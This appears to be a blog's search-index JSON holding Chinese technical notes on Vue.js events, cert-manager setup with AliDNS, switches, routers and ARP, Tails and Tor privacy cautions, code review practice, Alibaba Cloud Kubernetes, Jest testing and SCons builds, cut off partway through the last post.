&#125;&#125;&lt;/li&gt; &lt;li class=&quot;divider&quot; role=&quot;presentation&quot;&gt;&lt;/li&gt; &lt;/template&gt; &lt;/ul&gt; v-for 与 v-if 一同使用正常情况下，v-for 与 v-if 不建议同时使用，因为它们两个有优先级的差别，因此有可能产生预期外的结果；v-for 的优先级高于 v-if，因此当它们同时作用一个元素时，会先渲染出列表，之后再判断是否该某个列表条目； 123&lt;li v-for=&quot;todo in todos&quot; v-if=&quot;!todo.isComplete&quot;&gt; &#123;&#123; todo &#125;&#125; &lt;/li&gt; 在组件上使用 v-for数据不会自动被传递到组件里，需要使用组件的 prop 属性来传递数据； 123456&lt;my-component v-for=&quot;(item, index) in items&quot; v-bind:item=&quot;item&quot; v-bind:index=&quot;index&quot; v-bind:key=&quot;item.id&quot; &gt;&lt;/my-component&gt; 事件处理监听事件v-on 可以用监听一些 DOM 事件，之后触发一些提前写好的操作； 1234&lt;div id=&quot;example-1&quot;&gt; &lt;button v-on:click=&quot;counter += 1&quot;&gt;Add 1&lt;/button&gt; &lt;p&gt;The button above has been clicked &#123;&#123; counter &#125;&#125; times.&lt;/p&gt; &lt;/div&gt; 123456var example1 = new Vue(&#123; el: &#x27;#example-1&#x27;, data: &#123; counter: 0 &#125; &#125;); 事件处理方法操作除了可以作为表达式写在元素中，也可以作一个单独的函数，写在 Vue 实例的方法中； 内联处理器中的方法除了给元素绑定方法外，还可以在元素中直接调用方法 1234&lt;div id=&quot;example-3&quot;&gt; &lt;button v-on:click=&quot;say(&#x27;hi&#x27;)&quot;&gt;Say hi&lt;/button&gt; &lt;button v-on:click=&quot;say(&#x27;what&#x27;)&quot;&gt;Say what&lt;/button&gt; &lt;/div&gt; 12345678new Vue(&#123; el: &#x27;#example-3&#x27;, methods: &#123; say: function (message) &#123; alert(message) &#125; &#125; &#125;); 原始的 DOM 事件可以使用 $event 进行引用，并且还可以作为参数传递给实例的方法或者内置方法； 123&lt;button v-on:click=&quot;warn(&#x27;Form cannot be submitted yet.&#x27;, $event)&quot;&gt; Submit &lt;/button&gt; 123456789methods: &#123; warn: function (message, event) &#123; // 现在我们可以访问原生事件对象 if (event) &#123; event.preventDefault() &#125; alert(message); &#125;&#125; 事件修饰符事件修饰符使用点符号来表示，接在事件名称的后面，常见的事件修饰包括： stop：阻止事件传播 prevent：取消事件的默认行为 capture：优先捕获事件进行处理； self：限制事件在当前元素； once：控制事件只发生一次； passive 123456789101112131415&lt;!-- 阻止单击事件继续传播 --&gt; &lt;a v-on:click.stop=&quot;doThis&quot;&gt;&lt;/a&gt; &lt;!-- 提交事件不再重载页面 --&gt; &lt;form v-on:submit.prevent=&quot;onSubmit&quot;&gt;&lt;/form&gt; &lt;!-- 修饰符可以串联 --&gt; &lt;a v-on:click.stop.prevent=&quot;doThat&quot;&gt;&lt;/a&gt; &lt;!-- 只有修饰符 --&gt; &lt;form v-on:submit.prevent&gt;&lt;/form&gt;&lt;!-- 添加事件监听器时使用事件捕获模式 --&gt; &lt;!-- 即内部元素触发的事件先在此处理，然后才交由内部元素进行处理 --&gt; &lt;div v-on:click.capture=&quot;doThis&quot;&gt;...&lt;/div&gt; 修饰符的顺序是很重要的，不同顺序意味着不一样的行为表现； 按键修饰符按键修饰符用来监听键盘的按键，当某个按键被按下松开后，作出相应的响应； 12&lt;!-- 只有在 `key` 是 `Enter` 时调用 `vm.submit()` --&gt; &lt;input v-on:keyup.enter=&quot;submit&quot;&gt; 系统修饰键系统修饰键比较特殊，它相当于要求在触发某个事件前，相应的系统键需要处于被按下的状态 ctrl alt shift meta .exact 修饰符普通的系统修饰键仅关心某个按键是否被按下，但没有限制是否有多余按键被一起按了；如果要限制仅限某个按键被单独唯一的按下，没有多余的其他键，则可以添加 .exact 修饰符； 1234567&lt;!-- 即使 Alt 或 Shift 被一同按下时也会触发 --&gt; &lt;button v-on:click.ctrl=&quot;onClick&quot;&gt;A&lt;/button&gt; &lt;!-- 有且只有 Ctrl 被按下的时候才触发 --&gt; &lt;button v-on:click.ctrl.exact=&quot;onCtrlClick&quot;&gt;A&lt;/button&gt; &lt;!-- 没有任何系统修饰符被按下的时候才触发 --&gt; &lt;button v-on:click.exact=&quot;onClick&quot;&gt;A&lt;/button&gt; 鼠标按钮修饰符用来限制仅某些鼠标按钮被按下时才会触发的事件 left right middle 表单输入绑定v-model 指令可以在表单输入元素上实现数据的双向绑定；","categories":[{"name":"工具","slug":"工具","permalink":"http://example.com/categories/%E5%B7%A5%E5%85%B7/"}],"tags":[{"name":"javascript","slug":"javascript","permalink":"http://example.com/tags/javascript/"}]},{"title":"Cert-Manager 证书申请","slug":"Cert-Manager 证书申请","date":"2021-07-20T03:46:00.000Z","updated":"2024-09-21T23:13:54.217Z","comments":true,"path":"2021/07/20/Cert-Manager 证书申请/","permalink":"http://example.com/2021/07/20/Cert-Manager%20%E8%AF%81%E4%B9%A6%E7%94%B3%E8%AF%B7/","excerpt":"","text":"目前腾讯云 EKS 安装 cert-manager 和 alidns webhook 过程中会报错，只能使用 TKE 0. 准备工作 创建集群 1. 安装 cert-manager1kubectl apply -f https://github.com/jetstack/cert-manager/releases/download/v1.3.0/cert-manager.yaml 如果不能访问 github，则可以先下载文件到本地 2. 安装 alidns-webhook1kubectl apply -f https://raw.githubusercontent.com/pragkent/alidns-webhook/master/deploy/bundle.yaml 如果不能访问 github，则可以先下载文件到本地，此步不能太快，需确保第1步安装 cert-manager 时，所有的 pod 都已经正常运行后，再安装 webhook，不然无法成功；当出现失败时，可删除整个 webhook deployment，再重新创建 3. 创建访问 AliDNS 解析用的账号密码12345678apiVersion: v1kind: Secretmetadata: name: alidns-secret namespace: cert-managerdata: # 如果用 stringData，则下面两个属性就不需要编码 access-key: YOUR_ID # 需 base64 转码 secret-key: YOUR_KEY # 需 base64 转码 注：此处的 ID 和 KEY 需要先进行 base64 转码，除非将 data 字段改成 stringData 4. 创建 ClusterIssuer1234567891011121314151617181920212223apiVersion: cert-manager.io/v1alpha2kind: ClusterIssuermetadata: name: letsencryptspec: acme: email: YOUR_EMAIL # Change to your letsencrypt email server: https://acme-v02.api.letsencrypt.org/directory privateKeySecretRef: name: letsencrypt-account-key solvers: - dns01: webhook: groupName: acme.yourcompany.com solverName: alidns config: region: &quot;&quot; accessKeySecretRef: name: alidns-secret key: access-key secretKeySecretRef: name: alidns-secret key: secret-key 5. 创建证书1234567891011apiVersion: cert-manager.io/v1alpha2kind: Certificatemetadata: name: YOUR_CERT_NAME # 证书名，供 pod 引用spec: secretName: www-example-com-tls # 最终签发出来的证书会保存在这个 Secret 里面 dnsNames: - www.example.com # 待签发证书的域名 issuerRef: name: letsencrypt kind: ClusterIssuer 如果创建过程中出现错误，可以使用 kubectl describe &lt;资源类型&gt; &lt; 资源名称&gt; ，根据显示的消息，进行错误排查，例如： kubectl desribe certificate example kubectl describe ClusterIssuer example 详细排查办法查看以下链接：https://cert-manager.io/docs/faq/acme/","categories":[{"name":"运维","slug":"运维","permalink":"http://example.com/categories/%E8%BF%90%E7%BB%B4/"}],"tags":[{"name":"Kubernetes","slug":"Kubernetes","permalink":"http://example.com/tags/Kubernetes/"}]},{"title":"交换机和路由器的区别","slug":"交换机和路由器的区别","date":"2021-07-18T03:09:00.000Z","updated":"2024-09-21T23:09:09.094Z","comments":true,"path":"2021/07/18/交换机和路由器的区别/","permalink":"http://example.com/2021/07/18/%E4%BA%A4%E6%8D%A2%E6%9C%BA%E5%92%8C%E8%B7%AF%E7%94%B1%E5%99%A8%E7%9A%84%E5%8C%BA%E5%88%AB/","excerpt":"","text":"交换机 交换机工作在第2层，它维护着一份 Mac 地址和网线连接端口的映射表，所有连接它的设备都写在表中。当它收到一个数据包时，它读取数据包中的 Mac 地址，然后从映射表中查到对应的端口号，然后将数据包转发到对应的连接端口； 如果从映射表中找不到 Mac 地址映射，则交换机将简单粗暴的将该数据包发送给所有的端口；之后匹配该 MAC 地址的目标设备会响应交换机，然后交换机就知道拥有该 MAC 地址的设备连接着自己的哪个端口了，然后它会更新自己的映射表，这样下次再有相同的请求进来，就不需要广播，而是直接转发了； 当交换机将数据包广播给所有端口时，其扮演的角色就有点像 Hub 集线器了； 疑问：发起请求的设备，是如何知道目标设备的 MAC 地址的呢？ 路由器 路由器工作在第3层，它有两个职责： 为所有连接它的终端设备建立一个内部局域网； 与外部局域网建立通信； 路由器将从第3层中读取 IP 地址信息，然后从其维护的路由表中找到对应的端口号，将数据包转发给相应的端口号。如果找不到，则直接丢弃数据包； ARP Address Resolution Protocol，地址解析协议，其实就是一份 IP 地址和 MAC 地址的映射表 当某个设备 A 连接到路由器上面时，它会被分配一个 IP 地址，同时会被告知网关的 IP 地址。这样，当该设备尝试与另外一台设备通信时，它会先检查自己的 ARP 表中，是否有目标 IP 的 MAC 地址 如果有，它直接提取该 MAC 地址，写入数据包第2层头部，发送出去； 如果没有，它需要检查一下该目标设备的 IP 是否与自己在同一个局域网中 如果在，它将在局域网中广播一个该 IP 地址的 ARP 请求；持有该 IP 的目标设备将响应该广播，不持有该 IP 的其他设备将忽略该广播； 如果不在，它将在局域网中广播网关 IP 地址的 ARP 请求，网关在收到该广播后，将会响应自己的 MAC 地址给设备 A； 当通过广播获得 MAC 地址后，设备 A 将该 MAC 地址缓存到自己的 ARP 映射表中，然后将其写入数据包第2层头部发送出去； 很奇怪，为什么不直接使用路由器的 MAC 地址来打包呢，这样就不需要额外发送一次 ARP 请求了；路由器收到后，再解析到第3层中的 IP 来获知数据包的目的地，貌似这种方法也是可以的，为什么要额外引入 ARP 机制呢？ 答：原来是因为两台设备不一定通过路由器连接。当它们通过路由器来连接时，上面的方式确实是可行的。但是它们也有可能是直连，或者通过交换机来连接，这个时候，在生成第2层时，就无法直接填写路由器的 IP 地址了；因此，通用的方式是广播 ARP 请求，来得知目标 IP 地址的 MAC 地址。ARP 机制可以工作在任意一种连接场景中，直连，集线器、交换机、路由器等都可以； 关键点：当某个终端设备被连接时，该设备是不知道也无须知道自己连接的是什么类型的设备，它只需关心自己的工作，即打包好各层数据即可。当缺少目标 MAC 地址时，就广播 ARP 请求得到它，然后完成打包并发送数据即可，剩下的工作都是别人的。","categories":[{"name":"运维","slug":"运维","permalink":"http://example.com/categories/%E8%BF%90%E7%BB%B4/"}],"tags":[{"name":"网络","slug":"网络","permalink":"http://example.com/tags/%E7%BD%91%E7%BB%9C/"}]},{"title":"TailsOS 注意事项","slug":"TailsOS 注意事项","date":"2021-06-29T23:33:00.000Z","updated":"2024-09-21T23:18:51.726Z","comments":true,"path":"2021/06/30/TailsOS 注意事项/","permalink":"http://example.com/2021/06/30/TailsOS%20%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9/","excerpt":"","text":"保护个人身份信息可能泄露个人身份信息的活动： 分享带有元信息的文件，常见的文件元信息包含日期、时间、定位、设备信息等； 将 Tails 同时用于多种场景； Tor 的缺陷 当使用 Tor 时，不管对于 ISP，还是对于目标网站，都是透明的，只要它们收集一份 Tor 的中继服务器列表，即可知道当前的访问请求来自 Tor 网络； 当所访问的目标网站没有使用 HTTPS 建立连接时，出口节点可以监听请求内容，甚至伪装成目标网站； 因为 Tor 使用三节点的固定线路，因此通过监听入口节点和出口节点，比对请求时间和数据包，有可能识别出用户身份（这种方法称为端到端关联攻击）； 使用事项 仅当电脑处于关机状态时，再插入并启动，避免在其他系统处于运行状态时插入 U 盘； Tails U 盘只用于运行操作系统，避免用它跟其他操作系统拷贝文件； 尽量避免使用公共电脑运行 Tails，因为其硬件有可能被修改（例如增加键盘记录器来获取输入的各种信息，此时需要通过密码管理器来复制粘贴密码，避免使用键盘输入；或者使用屏幕键盘来点击输入密码）；","categories":[{"name":"工具","slug":"工具","permalink":"http://example.com/categories/%E5%B7%A5%E5%85%B7/"}],"tags":[{"name":"安全","slug":"安全","permalink":"http://example.com/tags/%E5%AE%89%E5%85%A8/"}]},{"title":"SecurityOS","slug":"SecurityOS","date":"2021-06-21T00:46:00.000Z","updated":"2024-09-21T23:18:47.078Z","comments":true,"path":"2021/06/21/SecurityOS/","permalink":"http://example.com/2021/06/21/SecurityOS/","excerpt":"","text":"主打安全的操作系统主要分成两类： 以匿名为目标； 以研究为目标，一般包含渗透测试工具； 常见的三个以匿名为目标的 OS： Tails：不在主机上安装保存任何文件或程序，这意味着当移动介质（如 U 盘或光盘）被拔走后，主机上找不到使用记录； Qubes：通过创建多个虚拟机，来实现 APP 之间的隔离；这样当某个 APP 被攻击时，不会影响到其他 APP； Whonix：通过将应用和通信分成两个模块，所有应用运行在虚拟机中，所有通信由一个单独的网关模块进行控制；网关默认连接到 Tor 网络中； 三个 OS 实现不同的安全实现，使得它们适用于不同的安全场景，大致如下：","categories":[{"name":"工具","slug":"工具","permalink":"http://example.com/categories/%E5%B7%A5%E5%85%B7/"}],"tags":[{"name":"安全","slug":"安全","permalink":"http://example.com/tags/%E5%AE%89%E5%85%A8/"}]},{"title":"Code Review","slug":"Code Review","date":"2021-06-21T00:10:00.000Z","updated":"2024-09-21T23:14:10.604Z","comments":true,"path":"2021/06/21/Code Review/","permalink":"http://example.com/2021/06/21/Code%20Review/","excerpt":"","text":"Code Review标准代码审核的目标，是为了让整个项目的代码库，随着时间推移，质量有所进步，而不是发生了退化； 为了达到这个目标，需要做一些取舍： 小步迭代胜于追求完美主义； 确保代码质量不退化，是审核人员的责任； 审核人员对所审核的代码拥有责任和相同的所有权； 原则：只要所提交的代码改进了代码库的质量，即使该代码不完美，也应该审核通过； 质量改进维度： * 更容易维护； * 更容易阅读； * 更容易理解； 经验交流代码走查同时是一种交流经验的机会，但不要强制遵守某种经验。可以在注释中某些更好的做法，但同时备注“仅供参考”； 原则 事实和数据优于看法和偏好； 如果有代码风格规定的话，就遵守规定；没有规定的部分，则按作者的偏好； 软件设计不属于个人偏好的范畴，而应该遵守基本的原则，除非作者能够有充足的理由，能够证明其合理性； 处理冲突 当出现冲突时，双方应根据既有原则达成一致意见； 如果有困难，则向上汇报，由其他人开会讨论协助判断； 走查什么设计 是否设计良好？ 模块之间是否高内聚，低耦合？ 功能 功能是否能如预期那样工作？ 复杂性是否过于复杂了，复杂的标准为“无法快速看懂代码要做什么”；主要包括以下几个层面： 行、函数、类； 是否存在过度工程？ 测试 是否包含单元测试、集成测试、端到端测试？ 测试本身是否正确？ 命名 命名是否合适，让人能够直接从名称看出意图或内容？ 注释 注释是否用来说明原因，而不是用来描述动作？ 是否为正则和复杂算法写了注释？ 注释是否和文档有所区分，文档用来详细描述代码意图、使用方法、最终效果等； 风格 尽量使用既定的风格指南，除非有特殊原因； 文档 如果代码涉及外部使用方式的变化，则检查是否更新了文档（增加或者删除）； 每一行 走查每一行代码，而不是假设某些代码能够正确运行，而忽略对它们的走查； 如果觉得某些代码过于复杂，自己没有把握确保它们的正确性，则应请求其他更有经验和能力的成员的帮助； 如果代码过于难懂，就要求作者解释它们； 宏观视角 尝试站在更宏观的角度来思考代码变更可能带来的影响，而不是仅仅看局部出现变化的代码； 思考新的代码，是否让整个项目的代码质量退化了？如果是的话，应即时修正它；因为大退化总是由无数小退化累积起来的； 不吝赞美 当发现某些代码写得很好时，不要吝啬自己的赞美，在注释中把自己的赞美表达出来； 走查步骤 先宏观的了解新提交的代码的目标（想要做些什么），并思考目标是否有意义，如果没有意义，就诚恳的提出，并给出新目标（如果这种情况经常发生，说明团队缺乏沟通，导致成员的工作目标不一致，应该改进）； 查看提交中发生最大变化的位置；如果发现设计问题，应该第一时间给作者指出，以免对方在错误的基础上继续走太远； 弄清楚目标后，按顺序浏览实现目标的文件；如果可以的话，看主要代码前，先看一下测试，也会对目标的了解提供帮助； 走查速度 走查的速度应该越快越好，因为反馈的越快，它带来的负面效果越小，正面效果越大； 走查的时间不应越过一天；一般来说，今天提交的代码，第二天应该给出反馈； 如果自己当前正在写代码，则不应停下来去做走查，而应该是当自己手头的任务完成后，再走查； 如果自己无法在1天内给出回复，则应该救助其他同事帮忙走查，而不是拖延； 如果提交走查的代码量很大，则应要求作者将它们进行拆分成多个提交； 如何写走查意见 保持谦逊的态度； 说明理由； 鼓励作者简化代码，或者添加注释；","categories":[{"name":"文章","slug":"文章","permalink":"http://example.com/categories/%E6%96%87%E7%AB%A0/"}],"tags":[{"name":"项目管理","slug":"项目管理","permalink":"http://example.com/tags/%E9%A1%B9%E7%9B%AE%E7%AE%A1%E7%90%86/"}]},{"title":"阿里云的 Kubernetes","slug":"阿里云的 Kubernetes","date":"2021-04-09T01:55:00.000Z","updated":"2024-09-21T23:08:56.844Z","comments":true,"path":"2021/04/09/阿里云的 Kubernetes/","permalink":"http://example.com/2021/04/09/%E9%98%BF%E9%87%8C%E4%BA%91%E7%9A%84%20Kubernetes/","excerpt":"","text":"简单介绍三个版本 专有版：自建 Master 和 Worker 节点，适用于所有场景，更加细颗粒度的管理；承担两种节点的费用； 托管版：自建 Worker 节点，适用于所有场景，无须管理 Master 节点；承担工作节点的费用； Serverless 版：无须建任何节点，按容器实例的使用资源数量和时长收费；适用于批量任务、突发扩容、CI&#x2F;CD 场景； 问：什么是 NAT 网关？ 答：它是构成 VPC 虚拟专用网络的一个核心组成部分；机器实例通过网关对外提供服务，并且接受外部的服务请求，它的作用看起来很像局域网中的路由器；路由器管理着内部的电脑，以统一的 IP 地址对外访问，同时也接收外部的请求，并转发给相应的机器实例； NAT 下面还细分为 SNAT 和 DNAT 两种场景，前者为内部的机器提供访问外部网络的服务；后者则暴露内部的机器，接受外部的请求，对外提供服务； 问：什么是 EIP？ 答：弹性公网 IP，Elastic IP Address；它可以为 NAT 提供物理 IP 地址，这样 NAT 才能正常工作； 问：什么是公网 SLB？ 答：Service Load Balance，负载均衡服务；用来将公网流量平均分发给多个机器实例；需要创建一个监听实例来实现；感觉相当于创建了一台部署了 Nginx 的实例一样； 问：什么是线下 IDC 答：Internet Data Center，互联网数据中心，名称看着很高大上，其实就是运营商或者一些第三方机构建立的机房，出租给企业使用；企业可以在机房中托管机器； 问：什么是 ENI? 答：ENI，elastic network interface，弹性网络接口，说白了，就是虚拟网卡；在配置局域网络时，内部的 IP 地址其实是指向某个虚拟网卡的；因此，当某台机器实例出现故障时，可以将 ENI 跟原机器解绑，然后绑定到新的机器实例中，这样可以在不改变原有的路由配置关系，对外部来说，一切都是透明的，仍然访问旧的 IP，但流量在不知不觉中，被引到了新的机器上面； 问：什么是安全组？ 答：安全组是一种虚拟的防火墙，通过配置一些安全组的规则，来实现对流量的访问控制； 问：什么是 ECI？ 答：Elastic Container Instance，弹性容器实例 命令行工具 价格","categories":[{"name":"运维","slug":"运维","permalink":"http://example.com/categories/%E8%BF%90%E7%BB%B4/"}],"tags":[{"name":"kubernetes","slug":"kubernetes","permalink":"http://example.com/tags/kubernetes/"}]},{"title":"Jest","slug":"Jest","date":"2021-02-07T03:49:00.000Z","updated":"2024-09-21T23:14:57.429Z","comments":true,"path":"2021/02/07/Jest/","permalink":"http://example.com/2021/02/07/Jest/","excerpt":"","text":"Jest 是一个 javacript 测试框架，特点是简单易上手 安装1npm install jest 需要 node 9.2 以上版本，因为 9.2 以下的版本不支持 try…catch 语法，运行时会报语法错误 Matcher1234567891011121314151617// 字面值使用 toBeexpect(2 + 2).toBe(4);// 对象使用 toEqualconst data = &#123;one: 1&#125;;data[&#x27;two&#x27;] = 2;expect(data).toEqual(&#123;one: 1, two: 2&#125;);// 取反使用 notexpect(4).not.toBe(3);// 字符串可正则匹配expect(&#x27;team&#x27;).not.toMatch(/I/);expect(&#x27;Christoph&#x27;).toMatch(/stop/);// 数组可判断是否包含expect([1, 2]).toContain(1); 异步处理回调模式使用 done 来处理回调模式的异步函数 123456789101112test(&#x27;callback pattern&#x27;, done =&gt; &#123; function callback(data) &#123; try &#123; expect(data).toBe(&#x27;something&#x27;); done(); &#125; catch (error) &#123; done(error); &#125; &#125; fetchData(callback);&#125;); Promise 模式返回 Promise 即可； 123456// 注意此处不要漏了写 return，不然实际返回的是 undefined；test(&quot;promise pattern&quot;, () =&gt; &#123; return fetchData().then(data =&gt; &#123; expect(data).toBe(&#x27;something&#x27;); &#125;)&#125;) Async&#x2F;Await 模式1234567891011121314test(&#x27;Async pattern&#x27;, async () =&gt; &#123; const data = await fetchData(); expect(data).toBe(&#x27;something&#x27;);&#125;);// 带异常的情况test(&#x27;Async pattern with error&#x27;, async () =&gt; &#123; try &#123; const data = await fetchData(); expect(data).toBe(&#x27;something&#x27;); &#125; catch (error) &#123; expect(error).toMatch(&#x27;error&#x27;); &#125;&#125;) 初始化和清理重复初始化1234567beforeEach(() =&gt; &#123; initDB(); // 如果 initDB 函数是异步的，则应为 return initDB()；&#125;);afterEach(() =&gt; &#123; clearDB();&#125;) 一次性初始化1234567beforeAll(() =&gt; &#123; return initDB();&#125;)afterAll(() =&gt; &#123; return clearDB();&#125;) 作用域使用 describe 来建立块的作用域 1234567891011beforeEach(&#x27;parent&#x27;);afterEach(&#x27;parent&#x27;);test(&#x27;parent1&#x27;);test(&#x27;parent2&#x27;);describe(&#x27;block&#x27;, () =&gt; &#123; beforeEach(&#x27;child&#x27;); afterEach(&#x27;child&#x27;); test(&#x27;child1&#x27;); test(&#x27;child2&#x27;);&#125;);// 注意：parent 的 beforeEach 会在 child 的 beforeEach 之前先执行；同时 parent 的 afterEach 在 child 的 afterEach 之后执行； 顺序控制所有的 describe 将在所有的 test 之前先执行； 12345678910111213141516171819202122232425262728293031323334describe(&#x27;outer&#x27;, () =&gt; &#123; console.log(&#x27;outer a&#x27;); describe(&#x27;inner 1&#x27;, () =&gt; &#123; console.log(&#x27;inner 1&#x27;); test(&#x27;test 1&#x27;, () =&gt; &#123; console.log(&#x27;test 1 inner 1&#x27;); &#125;); &#125;); console.log(&#x27;outer b&#x27;); test(&#x27;test 1&#x27;, () =&gt; &#123; console.log(&#x27;test 1 outer&#x27;); &#125;); describe(&#x27;inner 2&#x27;, () =&gt; &#123; console.log(&#x27;inner 2&#x27;); test(&#x27;test 2&#x27;, () =&gt; &#123; console.log(&#x27;test 2 inner 2&#x27;); &#125;); &#125;); console.log(&#x27;outer c&#x27;);&#125;);// 实际的输出顺序如下：// outer a// inner 1// outer b// inner 2// outer c// test 1 inner 1// test 1 outer// test 2 inner 2 单例测试test.only 方法可以使得只有该测试用例被执行；如果多例同时测试失败，但是单例测试可以成功，则说明某两个测试用例之间存在共享的变量，二者在测试过程中出现相互干扰的情况； Mock 函数mock 函数扮演拦截的作用，当在代码中对某个实际的函数进行调用时，拦截该调用，触发提前写好的 mock 函数，返回预设的结果； 用法1234567891011121314const mockFunc = jest.fn(x =&gt; 42 + x);forEach([0, 1], mockFunc);// 检查 mockFunc 是否被调用了两次expect(mockFunc.mock.calls.length).toBe(2);// 检查第一次调用时传入的参数值是否为 0expect(mockFunc.mock.calls[0][0]).toBe(0);// 检查第二次调用时传入的参数值是否为 1expect(mockFunc.mock.calls[1][0]).toBe(1);// 检查第一次调用时的返回值是否为 42expect(mockFunc.mock.results[0].value).toBe(42); 模拟返回值1234567const mock = jest.fn();console.log(mock());// &gt; undefinedmock.mockReturnValueOnce(10).mockReturnValueOnce(&#x27;x&#x27;).mockReturnValue(true);console.log(mock(), mock(), mock(), mock());// &gt; 10, &#x27;x&#x27;, true, true 模拟函数在多次连续调用时，返回不同的值 123456789101112const filterMock = jest.fn();filterMock.mockReturnValueOnce(true).mockReturnValueOnce(false);const result = [11, 12].filter(num =&gt; filterMock(num));console.log(result);console.log(filterMock.mock.calls[0][0]);console.log(filterMock.mock.calls[1][0]);// [11]// 11// 12 模拟模块的返回值123456789// users.js// 此处假设 user.js 调用了 axios 模块，调用其中的 get 方法获取用户数据import axios from &#x27;axios&#x27;;Class Users &#123; static all() &#123; return axios.get(&#x27;/user.json&#x27;).then(resp =&gt; resp.data); &#125;&#125; 12345678910111213// user.test.jsimport Users from &#x27;./users.js&#x27;;import axios from &#x27;axios&#x27;;jest.mock(&#x27;axios&#x27;);test(&#x27;should fetch users&#x27;, () =&gt; &#123; const users = [&#123;name: &#x27;bob&#x27;&#125;]; const resp = &#123;data: users&#125;; // 做了个假数据 axios.get.mockResolvedValue(resp); // 将假数据传进去 return Users.all().then(data =&gt; expect(data).toEqual(users));&#125;) 模拟模块的实现123456789101112// foo.jsmodule.exports = function () &#123; // do something&#125;// test.jsjest.mock(&#x27;../foo&#x27;); // foo 模块已经被伪装const foo = require(&#x27;../foo&#x27;); // 此处调用的 foo 已经是一个模拟函数foo.mockImplementation(() =&gt; 42); // 定义 foo 的行为foo();// &gt; 42 模拟多次调用时，函数表现不同的行为 123456789const mockFn = jest.fn() .mockImplementationOnce(cb =&gt; cb(null, true)) .mockImplementationOnce(cb =&gt; cb(null, false));mockFn((err, val) =&gt; console.log(val));// &gt; truemockFn((err, val) =&gt; console.log(val));// &gt; false 模块多次调用时，不同的行为 + 默认的行为 1234567const myMockFn = jest .fn(() =&gt; &#x27;default&#x27;) .mockImplementationOnce(() =&gt; &#x27;first call&#x27;) .mockImplementationOnce(() =&gt; &#x27;second call&#x27;);console.log(myMockFn(), myMockFn(), myMockFn(), myMockFn());// &gt; &#x27;first call&#x27;, &#x27;second call&#x27;, &#x27;default&#x27;, &#x27;default&#x27; 为模拟函数添加名称通过定义模拟的函数的名称，在测试的输出信息中，能够更清晰的定位哪个函数出错了 1234const mockFn = jest.fn() .mockReturnValue(&#x27;default&#x27;) .mockImplementation(scalar =&gt; scalar + 42) .mockName(&#x27;add42&#x27;); 快照用来比对界面是否与预期的一致；典型的使用方法是给某个 UI 组件预先存一份快照，然后与测试过程中生成的界面进行比对，检查二者是否一致，若一致，表示应用正常；如不一致，说明界面出现了意外的变化，此时有可能是应用出现异常，或者 快照本身需要更新；","categories":[{"name":"工具","slug":"工具","permalink":"http://example.com/categories/%E5%B7%A5%E5%85%B7/"}],"tags":[{"name":"javascript","slug":"javascript","permalink":"http://example.com/tags/javascript/"}]},{"title":"scons 用法","slug":"scons 用法","date":"2021-01-17T12:16:00.000Z","updated":"2024-09-21T23:18:38.774Z","comments":true,"path":"2021/01/17/scons 用法/","permalink":"http://example.com/2021/01/17/scons%20%E7%94%A8%E6%B3%95/","excerpt":"","text":"1. 基本概念SConstruct 是一个 Python 脚本，作用类似于 Makefile，我们通过它来告诉 Scons 要构建什么东西 2. 常用命令123456# 表示读取 SConstruct 脚本文件，开始构建scons# -c 选项表示清理现场，将构建出来的东西删除掉scons -c# -Q 选项表示安静模式，即不打印构建过程中的提示信息scons -Q 3. 简单构建单个源文件12345678# Program 用来告知 Scons 要构建可执行文件，参数即是源代码Program(&#x27;hello.c&#x27;)# 如果要指代可执行文件的名字，可写在第一个参数上Program(&#x27;my_hello&#x27;, &#x27;hello.c&#x27;)# Object 表示要构建目标文件Object(&#x27;hello.c&#x27;) 多个源文件12345678910# 如果源代码有多个文件，只需将它们放在一个列表中即可Program([&#x27;prog.c&#x27;, &#x27;file1.c&#x27;, &#x27;file2.c&#x27;])# Program 默认以列表第一个元素为最终编译结果的可执行文件的文件名，但是可以自定义Program(&#x27;my_prog&#x27;, [&#x27;prog.c&#x27;, &#x27;file1.c&#x27;, &#x27;file2.c&#x27;])# 如果文件很多个，可以使用关键字和 Glob 命令进行匹配# 通配符包括星号 *，问号 ?，以及部分关键字如 [abc] 表示任意满足 a, b 或 c 的文件均可# 也可以使用 [!abc] 进行排除，即不包括以上几个字母的，即是目标Program(&#x27;prog&#x27;, Glob(&#x27;*.c&#x27;)) 事实上，源代码文件在 Scons 内部都是当作列表来处理，单个文件的情况，会自动添加方括号而已；为了统一，建议还是都加上方括号比较好，同时也可以避免 Python 解释器报语法错误 自动加引号当有多个文件时，需要为每个文件打上双引号，如果文件一多，确实工作量不小；Scons 额外提供了一个 Split 名称，可以为文件自动添加引号，使用方法如下 12345678910111213# 使用 Split 函数自动添加引号，文件名之间只需要使用空格分隔即可Program(&#x27;prog&#x27;, Split(&#x27;main.c file1.c file2.c&#x27;))# 也可以用一个变量来代表多个文件的列表src_files = Split(&#x27;main.c file1.c file2.c&#x27;)Program(&#x27;program&#x27;, src_files)# 文件名之间有多个空格也没有关系# 此处用三个引号是为了符合 Python 对多行字符串的格式要求src_files = Split(&quot;&quot;&quot;main.c file1.c file2.c&quot;&quot;&quot;)Program(&#x27;program&#x27;, src_files) 指定参数名Program 支持指定参数名 12src_files = Split(&#x27;main.c file1.c file2.c&#x27;)Program(target = &#x27;program&#x27;, source = src_files) 多个编译目标如果想在同一个 scons 文件中编译多个可执行文件，只需多次调用 Program 函数即可 12Program(&#x27;foo.c&#x27;)Program(&#x27;bar&#x27;, [&#x27;bar1.c&#x27;, &#x27;bar2.c&#x27;]) 多目标共享源文件办法1：只需要将共享的文件放入源文件列表即可 12345678910# 此处 common1.c 和 common2.c 这两个文件是共享的Program(Split(&#x27;foo.c common1.c common2.c&#x27;))Program(&#x27;bar&#x27;, Split(&#x27;bar1.c bar2.c common1.c common2.c&#x27;))# 如果引用的次数很多，简单的做成变量进行引用即可common = [&#x27;common1.c&#x27;, &#x27;common2.c&#x27;]foo_files = [&#x27;foo.c&#x27;] + commonbar_files = [&#x27;bar1.c&#x27;, &#x27;bar2.c&#x27;] + commonProgram(&#x27;foo&#x27;, foo_files)Program(&#x27;bar&#x27;, bar_files) 办法2：将共享的文件做为库，由不同的目标进行引号 4. 构建和链接库构建库1234567891011# 使用 Library 函数即可构建库Library(&#x27;foo&#x27;, [&#x27;f1.c&#x27;, &#x27;f2.c&#x27;, &#x27;f3.c&#x27;])# 除了指定源文件外，也可以在文件列表中加入目标文件Library(&#x27;foo&#x27;, [&#x27;f1.c&#x27;, &#x27;f2.o&#x27;, &#x27;f3.c&#x27;, &#x27;f4.o&#x27;])# Library 函数默认构建静态库，同时还可以使用 StaticLibrary 